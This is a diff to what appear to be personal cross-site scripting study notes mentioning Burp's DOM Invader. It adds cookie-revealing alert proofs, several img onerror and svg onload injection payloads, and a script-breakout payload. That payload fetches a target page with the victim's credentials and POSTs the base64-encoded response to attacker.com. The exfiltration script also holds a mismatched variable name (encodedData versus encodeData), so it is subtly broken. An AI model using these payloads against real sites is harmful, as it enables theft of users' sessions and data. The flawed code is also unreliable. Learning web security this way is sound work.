@@ -3,6 +3,7 @@
 Proof:
 alert()
 alert(document.domain)
+alert(document.cookie)
 print()
 
 Reflected cross-site scripting:
@@ -24,3 +25,27 @@ eval() or innerHTML --> enables attackers to execute malicious JavaScript
 
 DOM Invader --> Burp's built-in browser
 
+"</script><script>
+        fetch("https://targetURL.com", {
+                  credentials: 'include'
+        })
+        .then(async (response) => {
+                if(response.status != 401){
+                        let data = await response.text();
+                        let encodedData = btoa(unescape(encodeURIComponent(data)));
+                        fetch("https://www.attacker.com", {
+                                method: 'POST',
+                                headers: {
+                                          'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                        msg: encodeData
+                                })
+                        })
+                }
+          })
+</script>
+
+<img src=x onerror=alert("message")>
+<img src=x onerror=prompt(1)>
+;</script><svg onload=alert("message")>
